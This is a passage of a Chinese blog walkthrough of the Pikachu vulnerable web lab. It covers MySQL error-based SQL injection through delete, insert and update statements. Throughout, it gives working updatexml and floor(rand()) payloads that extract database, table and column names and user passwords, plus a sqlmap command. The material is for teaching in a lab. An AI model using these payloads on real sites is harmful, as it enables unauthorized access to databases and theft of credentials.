<p>group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的对象便是该临时表的主键。如果临时表中已经存在该主键，则将count(*)值加1，如果不存在，则将该主键插入到临时表中，注意是插入！查询前创建的空临时表。 </p>
<p>那就产生了一个问题</p>
<p>floor(rand(0)*2不是0就是1，当插入了临时表后，为什么不是count(*)加1，而是报错</p>
<p>因为还有一个最重要的特性，就是group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次(已经是决定插入，但再计算一遍值)，就是这个特性导致了主键重复并报错。</p>
<p>我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),username from users group by username;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230224093155425.png" alt="image-20230224093155425"></p>
<p>上述命令会以username作为主键</p>
<p>按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(user(),floor(rand(0)*2))x from users group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230224094415861.png" alt="image-20230224094415861"></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>上述是比较常见的几种报错注入</p>
<p>其余的报错注入利用可参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>由于是delete注入，抓取删除的数据包</p>
<p><img src="/images%5Cimage-20230109224454398.png" alt="image-20230109224454398"></p>
<p>delete语法</p>
<p><img src="/images%5Cimage-20230109224541248.png" alt="image-20230109224541248"></p>
<p>源码大概类似为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名 where id=57</span><br></pre></td></tr></table></figure>

<h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><p>由于可控的位置在where后面，无法直接通过union select输出内容</p>
<p>利用报错注入</p>
<h5 id="获取数据库-2"><a href="#获取数据库-2" class="headerlink" title="获取数据库"></a>获取数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select database()),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109224846408.png" alt="image-20230109224846408"></p>
<h5 id="获取字段值-2"><a href="#获取字段值-2" class="headerlink" title="获取字段值"></a>获取字段值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select username from users limit 0,1),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109225205208.png" alt="image-20230109225205208"></p>
<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>先自己注册一个账号</p>
<p><img src="/images%5Cimage-20230109151523594.png" alt="image-20230109151523594"></p>
<p>insert和update都是更新数据库的关键词，由此可以判断注入应该存在于注册阶段</p>
<p><img src="/images%5Cimage-20230109151801590.png" alt="image-20230109151801590"></p>
<p>抓取数据包</p>
<p><img src="/images%5Cimage-20230109151855923.png" alt="image-20230109151855923"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109153408606.png" alt="image-20230109153408606"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109153447170.png" alt="image-20230109153447170"></p>
<p>可以判断大致源码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名(用户名,密码,性别,电话,地址,住址) values(数据1,数据2,数据3,数据4,数据5,数据6);</span><br></pre></td></tr></table></figure>

<p>因为这里没有回显，需要用到报错注入</p>
<p>insert into 表名(‘a’ and updatexml(1,concat(‘.’,(select database()),’~’),1) ,’密码,性别,电话,地址,住址) values(数据1,数据2,数据3,数据4,数据5,数据6);</p>
<h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h2><p>相关报错注入的前置知识在《报错注入前置知识》中</p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109171528855.png" alt="image-20230109171528855"></p>
<p>这里不用0x7e(~)也行，可以用’.’替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select database()),&#x27;~&#x27;),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109220259851.png" alt="image-20230109220259851"></p>
<p>构造后的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>把主要部分提出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>可以看出来username其实为一个or语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>可以做一个测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,name) values(1 or 2,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109201349029.png" alt="image-20230109201349029"></p>
<p>or(或)，当前面为真时则只执行前面的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,name) values(0 and 1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109201644077.png" alt="image-20230109201644077"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,name) values(0 or 1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109201838975.png" alt="image-20230109201838975"></p>
<p>可以看到这里是一个类似bool的判断，为真则为1，为假(0)则为0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,name) values(1 or &quot;haha&quot;,&#x27;root&#x27; );</span><br></pre></td></tr></table></figure>

<p>如果是字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,name) values(1,&#x27;&#x27; or &#x27;&#x27;  );</span><br><span class="line">insert into test(id,name) values(1,&#x27;&#x27; or null  );</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109210800957.png" alt="image-20230109210800957"></p>
<p>后续可以自己尝试</p>
<p>放入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(id,name) values(1,updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109210927245.png" alt="image-20230109210927245"></p>
<h3 id="获取数据表名"><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="group-concat-1"><a href="#group-concat-1" class="headerlink" title="group_concat()"></a>group_concat()</h5><p>group_concat看起来和concat很像，其实差蛮多</p>
<p>group_concat可以将某一列所有的值，拼接成一个字符串</p>
<p>而concat如果参数是某一列字符串，输出的还是某一列</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id,&quot;test&quot;) from test; </span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109213909438.png" alt="image-20230109213909438"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(id,&quot;test&quot;) from test; </span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109213937383.png" alt="image-20230109213937383"></p>
<p>这两函数用哪一个，完全看场景(正常注入group_concat较多，盲注中会存在cancat)</p>
<p>当只需要一个字符串时，用group_concat</p>
<h5 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h5><p>可能会遇到数据过长而显示不完全的情况</p>
<p>使用limit限制查询数量，每次查询一条结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>limit和substr的语法类似</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit m,n</span><br></pre></td></tr></table></figure>

<p>m表示起始位置，n表示读取几行，从第m条记录开始, 返回n条记录 </p>
<h3 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="获取字段值-3"><a href="#获取字段值-3" class="headerlink" title="获取字段值"></a>获取字段值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询用户名</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line">查询密码</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>查询密码时最后一位显示不完全，可能是因为长度太长,将~替换为.就可以显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1)),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap-8"><a href="#sqlmap-8" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_iu/sqli_reg.php&quot; --data=&quot;username=admin&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit&quot; -p username --batch</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109222211826.png" alt="image-20230109222211826"></p>
<h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>登录后修改个人信息</p>
<p><img src="/images%5Cimage-20230109222929316.png" alt="image-20230109222929316"></p>
<p>抓取数据包</p>
<p><img src="/images%5Cimage-20230109223022020.png" alt="image-20230109223022020"></p>
<p>和insert注入的逻辑差不多，无非就是源码上的区别，造闭合，报错注入一把梭就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;</span><br></pre></td></tr></table></figure>

<h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h2><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=nan&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>拼接和insert注入相同，这里就不分析了</p>
<p><img src="/images%5Cimage-20230109224038685.png" alt="image-20230109224038685"></p>
<h5 id="猜字段信息-1"><a href="#猜字段信息-1" class="headerlink" title="猜字段信息"></a>猜字段信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select username from users limit 0,1),&#x27;~&#x27;),1) or &#x27;</span><br><span class="line"></span><br><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 1,1),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/" rel="prev" title="pikachu靶场系列-SSRF">
                  <i class="fa fa-chevron-left"></i> pikachu靶场系列-SSRF
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/" rel="next" title="pikachu靶场系列-RCE">
                  pikachu靶场系列-RCE <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fn</span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>-->

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  





</body>
</html>
